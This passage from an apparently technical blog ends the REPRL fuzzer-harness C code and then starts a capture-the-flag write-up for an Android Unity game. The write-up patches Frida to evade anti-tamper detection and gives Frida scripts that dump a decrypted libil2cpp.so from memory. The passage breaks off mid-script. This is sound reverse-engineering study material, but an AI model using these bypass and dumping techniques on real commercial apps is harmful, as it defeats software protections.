class="number">1</span>]);</span><br><span class="line">    <span class="built_in">close</span>(cwpipe[<span class="number">0</span>]);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (pid &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">close</span>(ctx-&gt;ctrl_in);</span><br><span class="line">        <span class="built_in">close</span>(ctx-&gt;ctrl_out);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">reprl_error</span>(ctx, <span class="string">&quot;Failed to fork: %s&quot;</span>, <span class="built_in">strerror</span>(errno));</span><br><span class="line">    &#125;</span><br><span class="line">    ctx-&gt;pid = pid;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> helo[<span class="number">5</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">read</span>(ctx-&gt;ctrl_in, helo, <span class="number">4</span>) != <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="built_in">reprl_terminate_child</span>(ctx);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">reprl_error</span>(ctx, <span class="string">&quot;Did not receive HELO message from child: %s&quot;</span>, <span class="built_in">strerror</span>(errno));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strncmp</span>(helo, <span class="string">&quot;HELO&quot;</span>, <span class="number">4</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">reprl_terminate_child</span>(ctx);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">reprl_error</span>(ctx, <span class="string">&quot;Received invalid HELO message from child: %s&quot;</span>, helo);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">write</span>(ctx-&gt;ctrl_out, helo, <span class="number">4</span>) != <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="built_in">reprl_terminate_child</span>(ctx);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">reprl_error</span>(ctx, <span class="string">&quot;Failed to send HELO reply message to child: %s&quot;</span>, <span class="built_in">strerror</span>(errno));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>整个reprl_execute实现流程：将脚本内容复制到数据通道，向子进程发送执行脚本的命令和脚本长度，等待子进程执行完成或崩溃，返回最终的子进程状态值。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">reprl_execute</span><span class="params">(<span class="keyword">struct</span> reprl_context* ctx, <span class="type">const</span> <span class="type">char</span>* script, <span class="type">uint64_t</span> script_length, <span class="type">uint64_t</span> timeout, <span class="type">uint64_t</span>* execution_time, <span class="type">int</span> fresh_instance)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!ctx-&gt;initialized) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">reprl_error</span>(ctx, <span class="string">&quot;REPRL context is not initialized&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (script_length &gt; REPRL_MAX_DATA_SIZE) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">reprl_error</span>(ctx, <span class="string">&quot;Script too large&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (timeout &gt; REPRL_MAX_TIMEOUT_IN_MICROSECONDS) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">reprl_error</span>(ctx, <span class="string">&quot;Timeout too large&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> timeout_ms = (<span class="type">int</span>)(timeout / <span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Terminate any existing instance if requested.</span></span><br><span class="line">    <span class="keyword">if</span> (fresh_instance &amp;&amp; ctx-&gt;pid) &#123;</span><br><span class="line">        <span class="built_in">reprl_terminate_child</span>(ctx);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Reset file position so the child can simply read(2) and write(2) to these fds.</span></span><br><span class="line">    <span class="built_in">lseek</span>(ctx-&gt;data_out-&gt;fd, <span class="number">0</span>, SEEK_SET);</span><br><span class="line">    <span class="built_in">lseek</span>(ctx-&gt;data_in-&gt;fd, <span class="number">0</span>, SEEK_SET);</span><br><span class="line">    <span class="keyword">if</span> (ctx-&gt;child_stdout) &#123;</span><br><span class="line">        <span class="built_in">lseek</span>(ctx-&gt;child_stdout-&gt;fd, <span class="number">0</span>, SEEK_SET);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (ctx-&gt;child_stderr) &#123;</span><br><span class="line">        <span class="built_in">lseek</span>(ctx-&gt;child_stderr-&gt;fd, <span class="number">0</span>, SEEK_SET);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Spawn a new instance if necessary.</span></span><br><span class="line">    <span class="keyword">if</span> (!ctx-&gt;pid) &#123;</span><br><span class="line">        <span class="type">int</span> r = <span class="built_in">reprl_spawn_child</span>(ctx);</span><br><span class="line">        <span class="keyword">if</span> (r != <span class="number">0</span>) <span class="keyword">return</span> r;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copy the script to the data channel.</span></span><br><span class="line">    <span class="built_in">memcpy</span>(ctx-&gt;data_out-&gt;mapping, script, script_length);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Tell child to execute the script.</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">write</span>(ctx-&gt;ctrl_out, <span class="string">&quot;exec&quot;</span>, <span class="number">4</span>) != <span class="number">4</span> ||</span><br><span class="line">        <span class="built_in">write</span>(ctx-&gt;ctrl_out, &amp;script_length, <span class="number">8</span>) != <span class="number">8</span>) &#123;</span><br><span class="line">        <span class="comment">// These can fail if the child unexpectedly terminated between executions.</span></span><br><span class="line">        <span class="comment">// Check for that here to be able to provide a better error message.</span></span><br><span class="line">        <span class="type">int</span> status;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">waitpid</span>(ctx-&gt;pid, &amp;status, WNOHANG) == ctx-&gt;pid) &#123;</span><br><span class="line">            <span class="built_in">reprl_child_terminated</span>(ctx);</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">WIFEXITED</span>(status)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">reprl_error</span>(ctx, <span class="string">&quot;Child unexpectedly exited with status %i between executions&quot;</span>, <span class="built_in">WEXITSTATUS</span>(status));</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">reprl_error</span>(ctx, <span class="string">&quot;Child unexpectedly terminated with signal %i between executions&quot;</span>, <span class="built_in">WTERMSIG</span>(status));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">reprl_error</span>(ctx, <span class="string">&quot;Failed to send command to child process: %s&quot;</span>, <span class="built_in">strerror</span>(errno));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Wait for child to finish execution (or crash).</span></span><br><span class="line">    <span class="type">uint64_t</span> start_time = <span class="built_in">current_usecs</span>();</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">pollfd</span> fds = &#123;.fd = ctx-&gt;ctrl_in, .events = POLLIN, .revents = <span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">int</span> res = <span class="built_in">poll</span>(&amp;fds, <span class="number">1</span>, timeout_ms);</span><br><span class="line">    *execution_time = <span class="built_in">current_usecs</span>() - start_time;</span><br><span class="line">    <span class="keyword">if</span> (res == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// Execution timed out. Kill child and return a timeout status.</span></span><br><span class="line">        <span class="built_in">reprl_terminate_child</span>(ctx);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span> &lt;&lt; <span class="number">16</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (res != <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="comment">// An error occurred.</span></span><br><span class="line">        <span class="comment">// We expect all signal handlers to be installed with SA_RESTART, so receiving EINTR here is unexpected and thus also an error.</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">reprl_error</span>(ctx, <span class="string">&quot;Failed to poll: %s&quot;</span>, <span class="built_in">strerror</span>(errno));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Poll succeeded, so there must be something to read now (either the status or EOF).</span></span><br><span class="line">    <span class="type">int</span> status;</span><br><span class="line">    <span class="type">ssize_t</span> rv = <span class="built_in">read</span>(ctx-&gt;ctrl_in, &amp;status, <span class="number">4</span>);</span><br><span class="line">    <span class="keyword">if</span> (rv &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">reprl_error</span>(ctx, <span class="string">&quot;Failed to read from control pipe: %s&quot;</span>, <span class="built_in">strerror</span>(errno));</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (rv != <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="comment">// Most likely, the child process crashed and closed the write end of the control pipe.</span></span><br><span class="line">        <span class="comment">// Unfortunately, there probably is nothing that guarantees that waitpid() will immediately succeed now,</span></span><br><span class="line">        <span class="comment">// and we also don&#x27;t want to block here. So just retry waitpid() a few times...</span></span><br><span class="line">        <span class="type">int</span> success = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            success = <span class="built_in">waitpid</span>(ctx-&gt;pid, &amp;status, WNOHANG) == ctx-&gt;pid;</span><br><span class="line">            <span class="keyword">if</span> (!success) <span class="built_in">usleep</span>(<span class="number">10</span>);</span><br><span class="line">        &#125; <span class="keyword">while</span> (!success &amp;&amp; <span class="built_in">current_usecs</span>() - start_time &lt; timeout);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!success) &#123;</span><br><span class="line">            <span class="comment">// Wait failed, so something weird must have happened. Maybe somehow the control pipe was closed without the child exiting?</span></span><br><span class="line">            <span class="comment">// Probably the best we can do is kill the child and return an error.</span></span><br><span class="line">            <span class="built_in">reprl_terminate_child</span>(ctx);</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">reprl_error</span>(ctx, <span class="string">&quot;Child in weird state after execution&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Cleanup any state related to this child process.</span></span><br><span class="line">        <span class="built_in">reprl_child_terminated</span>(ctx);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">WIFEXITED</span>(status)) &#123;</span><br><span class="line">            status = <span class="built_in">WEXITSTATUS</span>(status) &lt;&lt; <span class="number">8</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">WIFSIGNALED</span>(status)) &#123;</span><br><span class="line">            status = <span class="built_in">WTERMSIG</span>(status);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// This shouldn&#x27;t happen, since we don&#x27;t specify WUNTRACED for waitpid...</span></span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">reprl_error</span>(ctx, <span class="string">&quot;Waitpid returned unexpected child state %i&quot;</span>, status);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// The status must be a positive number, see the status encoding format below.</span></span><br><span class="line">    <span class="comment">// We also don&#x27;t allow the child process to indicate a timeout. If we wanted,</span></span><br><span class="line">    <span class="comment">// we could treat it as an error if the upper bits are set.</span></span><br><span class="line">    status &amp;= <span class="number">0xffff</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>sec2023_mobile-1</title>
      <link href="/2023/10/05/sec2023-mobile-1/"/>
      <url>/2023/10/05/sec2023-mobile-1/</url>
      
        <content type="html"><![CDATA[<p><strong>ida mac fix the crash：（suggest using paradell windows）</strong></p><p>delete~&#x2F;.idapro&#x2F;ida.reg</p><p>adb shell am start -D -n com.com.sec2023.rocketmouse.mouse&#x2F;com.unity3d.player.UnityPlayerActivity<br>Starting: Intent { cmp&#x3D;com.com.sec2023.rocketmouse.mouse&#x2F;com.unity3d.player.UnityPlayerActivity }</p><p><strong>Step 1 : Open ida to see if <a href="http://libil2cpp.so/">libil2cpp.so</a> is encrypted. Use frida dump and find that there is a detection (hack detect). Modify the frida characteristics to bypass the memory dump detection:</strong></p><p>we can modify the port number in the Frida source code, the temporary directory or the relevant string characteristics in the maps. For this one, we can directly modify the port <code>./fridasever -l 0.0.0.0:1234</code></p><p>modify port</p><p>change Frida port to lisenning in frida-core&#x2F;src&#x2F;frida-gadget-server.c</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#define DEFAULT_LISTEN_ADDRESS &quot;127.0.0.1&quot;</span><br><span class="line">#define DEFAULT_LISTEN_PORT    27042</span><br></pre></td></tr></table></figure><p>change the port behind DEFAULT_LISTEN_PORT</p><p>temporary directory</p><p>frida-core&#x2F;src&#x2F;frida-helper-backend-linux.c</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">static gchar *</span><br><span class="line">frida_helper_backend_get_system_temp_path (void)</span><br><span class="line">&#123;</span><br><span class="line">  return g_strdup (&quot;/tmp&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>change the “&#x2F;tmp” path</p><p>maps relevant strings</p><p>frida-core&#x2F;src&#x2F;frida-helper-backend-linux.c</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if (strstr (line, &quot;/libc.&quot;) || strstr (line, &quot;/libm.&quot;) || strstr (line, &quot;/libdl.&quot;))</span><br><span class="line">&#123;</span><br><span class="line">  frida_helper_backend_linux_parse_maps_entry (line, entry);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>then using dump so script :</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">dump_so</span>(<span class="params">so_name</span>) &#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> currentApplication = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.app.ActivityThread&quot;</span>).<span class="title function_">currentApplication</span>();</span><br><span class="line">        <span class="keyword">var</span> dir = currentApplication.<span class="title function_">getApplicationContext</span>().<span class="title function_">getFilesDir</span>().<span class="title function_">getPath</span>();</span><br><span class="line">        <span class="keyword">var</span> libso = <span class="title class_">Process</span>.<span class="title function_">getModuleByName</span>(so_name);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[name]:&quot;</span>, libso.<span class="property">name</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[base]:&quot;</span>, libso.<span class="property">base</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[size]:&quot;</span>, <span class="title function_">ptr</span>(libso.<span class="property">size</span>));</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[path]:&quot;</span>, libso.<span class="property">path</span>);</span><br><span class="line">        <span class="keyword">var</span> file_path = dir + <span class="string">&quot;/&quot;</span> + libso.<span class="property">name</span> + <span class="string">&quot;_&quot;</span> + libso.<span class="property">base</span> + <span class="string">&quot;_&quot;</span> + <span class="title function_">ptr</span>(libso.<span class="property">size</span>) + <span class="string">&quot;.so&quot;</span>;</span><br><span class="line">        <span class="keyword">var</span> file_handle = <span class="keyword">new</span> <span class="title class_">File</span>(file_path, <span class="string">&quot;wb&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (file_handle &amp;&amp; file_handle != <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="comment">//Memory.protect(ptr(libso.base.add(0x13b7000)), libso.size-0x13b7000, &#x27;rwx&#x27;);</span></span><br><span class="line">            <span class="title class_">Memory</span>.<span class="title function_">protect</span>(<span class="title function_">ptr</span>(libso.<span class="property">base</span>), libso.<span class="property">size</span>, <span class="string">&#x27;rwx&#x27;</span>);</span><br><span class="line">            <span class="keyword">var</span> libso_buffer = <span class="title function_">ptr</span>(libso.<span class="property">base</span>).<span class="title function_">readByteArray</span>(libso.<span class="property">size</span>);</span><br><span class="line">            file_handle.<span class="title function_">write</span>(libso_buffer);</span><br><span class="line">            file_handle.<span class="title function_">flush</span>();</span><br><span class="line">            file_handle.<span class="title function_">close</span>();</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[dump]:&quot;</span>, file_path);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">rpc.<span class="property">exports</span> = &#123;</span><br><span class="line">    <span class="attr">dump_so</span>: dump_so</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//frida -H 127.0.0.1:1234 -l &quot;libil2cpp_dump.js&quot; -f &quot;com.com.sec2023.rocketmouse.mouse&quot;</span></span><br></pre></td></tr></table></figure><p>then using Il2CppDumper dump dumped <a href="http://libil2cpp.so/">libil2cpp.so</a> to get string information.</p><p>S<strong>tep 2 : repair the dumped libil2cpp.so</strong></p><p>the dumped so file inside section using VA address offset, we should repair it when compare with original apk so file inside <code>Program Header Table</code>、<code>section_header_table</code>、<code>elf_header-&gt;e_shtrndx_STRING_TABLE_INDEX</code> using 010editor. Then IDA rebase segment and click <code>File-&gt;Script file...</code>run<code>il2cppdumper</code>which provided<code>da_with_struct_py3.py</code> to repair struct.</p><p> <strong>Or Step 2 : The .so file may decrypt before dlopen function load it，we can try to hook dlopen dump <a href="http://libil2cpp.so/">libil2cpp.so</a>, then fill in the tail relocation table：</strong></p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">WriteMemToFile</span>(<span class="params">addr, size, file_path</span>) &#123;</span><br><span class="line">  <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> prefix = <span class="string">&#x27;/data/data/com.com.sec2023.rocketmouse.mouse/files/&#x27;</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">var</span> mkdir = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&#x27;libc.so&#x27;</span>, <span class="string">&#x27;mkdir&#x27;</span>);</span><br><span class="line">    <span class="keyword">var</span> chmod = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&#x27;libc.so&#x27;</span>, <span class="string">&#x27;chmod&#x27;</span>);</span><br><span class="line">    <span class="keyword">var</span> fopen = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&#x27;libc.so&#x27;</span>, <span class="string">&#x27;fopen&#x27;</span>);</span><br><span class="line">    <span class="keyword">var</span> fwrite = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&#x27;libc.so&#x27;</span>, <span class="string">&#x27;fwrite&#x27;</span>);</span><br><span class="line">    <span class="keyword">var</span> fclose = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&#x27;libc.so&#x27;</span>, <span class="string">&#x27;fclose&#x27;</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">var</span> call_mkdir = <span class="keyword">new</span> <span class="title class_">NativeFunction</span>(mkdir, <span class="string">&#x27;int&#x27;</span>, [<span class="string">&#x27;pointer&#x27;</span>, <span class="string">&#x27;int&#x27;</span>]);</span><br><span class="line">    <span class="keyword">var</span> call_chmod = <span class="keyword">new</span> <span class="title class_">NativeFunction</span>(chmod, <span class="string">&#x27;int&#x27;</span>, [<span class="string">&#x27;pointer&#x27;</span>, <span class="string">&#x27;int&#x27;</span>]);</span><br><span class="line">    <span class="keyword">var</span> call_fopen =</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">NativeFunction</span>(fopen, <span class="string">&#x27;pointer&#x27;</span>, [<span class="string">&#x27;pointer&#x27;</span>, <span class="string">&#x27;pointer&#x27;</span>]);</span><br><span class="line">    <span class="keyword">var</span> call_fwrite =</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">NativeFunction</span>(fwrite, <span class="string">&#x27;int&#x27;</span>, [<span class="string">&#x27;pointer&#x27;</span>, <span class="string">&#x27;int&#x27;</span>, <span class="string">&#x27;int&#x27;</span>, <span class="string">&#x27;pointer&#x27;</span>]);</span><br><span class="line">    <span class="keyword">var</span> call_fclose = <span class="keyword">new</span> <span class="title class_">NativeFunction</span>(fclose, <span class="string">&#x27;int&#x27;</span>, [<span class="string">&#x27;pointer&#x27;</span>]);</span><br><span class="line"> </span><br><span class="line">    <span class="title function_">call_mkdir</span>(<span class="title class_">Memory</span>.<span class="title function_">allocUtf8String</span>(prefix), <span class="number">0x1FF</span>);</span><br><span class="line">    <span class="title function_">call_chmod</span>(<span class="title class_">Memory</span>.<span class="title function_">allocUtf8String</span>(prefix), <span class="number">0x1FF</span>);</span><br><span class="line">    <span class="keyword">var</span> fp = <span class="title function_">call_fopen</span>(</span><br><span class="line">        <span class="title class_">Memory</span>.<span class="title function_">allocUtf8String</span>(prefix + file_path),</span><br><span class="line">        <span class="title class_">Memory</span>.<span class="title function_">allocUtf8String</span>(<span class="string">&#x27;wb&#x27;</span>));</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_">call_fwrite</span>(addr, <span class="number">1</span>, size, fp)) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;[+] Write file success, file path: &#x27;</span> + prefix + file_path);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;[x] Write file failed&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="title function_">call_fclose</span>(fp);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">function</span> <span class="title function_">HookLibWithCallback</span>(<span class="params">name, callback</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> dlopen = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&#x27;libdl.so&#x27;</span>, <span class="string">&#x27;dlopen&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> detach_listener = <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(dlopen, &#123;</span><br><span class="line">    <span class="attr">onEnter</span>: <span class="keyword">function</span>(<span class="params">args</span>) &#123;</span><br><span class="line">      <span class="keyword">var</span> cur = args[<span class="number">0</span>].<span class="title function_">readCString</span>();</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;[+] dlopen called, name: &#x27;</span> + cur);</span><br><span class="line">      <span class="keyword">if</span> (cur.<span class="title function_">indexOf</span>(name) != -<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">hook</span> = <span class="literal">true</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">onLeave</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">hook</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;[+] Hook Lib success, name:&#x27;</span>, name);</span><br><span class="line">        <span class="title function_">callback</span>();</span><br><span class="line">        detach_listener.<span class="title function_">detach</span>();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">function</span> <span class="title function_">DumpIL2CPP</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> libil2cpp = <span class="title class_">TraverseModules</span>(<span class="string">&#x27;single&#x27;</span>, &#123;<span class="attr">name</span>: <span class="string">&#x27;libil2cpp.so&#x27;</span>&#125;);</span><br><span class="line">  <span class="title class_">WriteMemToFile</span>(libil2cpp.<span class="property">base</span>, libil2cpp.<span class="property">size</span>, <span class="string">&#x27;libil2cpp.so&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">function</span> <span class="title 